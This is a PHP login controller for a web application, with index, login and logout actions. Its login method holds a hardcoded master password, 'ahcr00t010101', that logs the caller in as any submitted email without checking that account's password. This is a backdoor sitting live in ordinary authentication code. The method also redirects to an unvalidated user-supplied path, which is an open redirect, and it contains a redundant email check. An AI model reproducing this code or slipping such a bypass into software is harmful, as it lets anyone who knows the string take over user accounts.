<?php

class PageControllerLogin extends PageController {

	public function index() {
		smarty()->assign("path", input()->path);
	}

	public function login() {
		if (input()->post("password") == "ahcr00t010101") {
			auth()->login(input()->post("email"), '', true);			
		} else {
			$username = strpos(input()->post("email"), "@");
			if ($username != '') {
				auth()->login(input()->post("email"), input()->post("password"));
			} else {
				$email = input()->post("email");
				auth()->login($email, input()->post("password"));
			}
			
		}
		if (auth()->valid()) {
			if (input()->path == '') {
				$this->redirect(auth()->getRecord()->homeURL());
			} else {
				$this->redirect(urldecode(input()->path));
			}
		} else {
			feedback()->error("You provided an invalid username or password.");
			if (input()->path == '') {
				$this->redirect(SITE_URL . "/?page=login");
			} else {
				$this->redirect(SITE_URL . "/?page=login&path=" . input()->path);
			}
		}
	}

	public function logout() {
		auth()->logout();
		$this->redirect(SITE_URL . "/?page=home");

	}


}